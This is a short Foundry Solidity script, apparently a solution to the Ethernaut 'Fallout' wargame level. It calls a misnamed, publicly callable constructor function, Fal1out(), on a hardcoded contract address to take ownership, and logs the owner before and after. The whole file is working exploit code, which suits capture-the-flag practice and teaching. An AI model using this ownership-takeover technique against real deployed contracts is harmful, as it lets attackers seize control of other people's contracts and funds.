// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;
//import "../instances/Ilevel00.sol";
import "forge-std/Script.sol";
import "../src/levels/02-Fallout/Fallout.sol";

contract ExploitScript is Script {
    Fallout level2 = Fallout(payable(0x0c1b7115e2E6e37C71306850e864A68b347ae969));

    function run() public {
        vm.startBroadcast();

        console.log("Current Owner is: ", level2.owner()); // querying current owner
        level2.Fal1out(); // calling the vulnerable function
        console.log("New Owner is: ", level2.owner()); // checking if the owner changed

        
        vm.stopBroadcast();
    }
}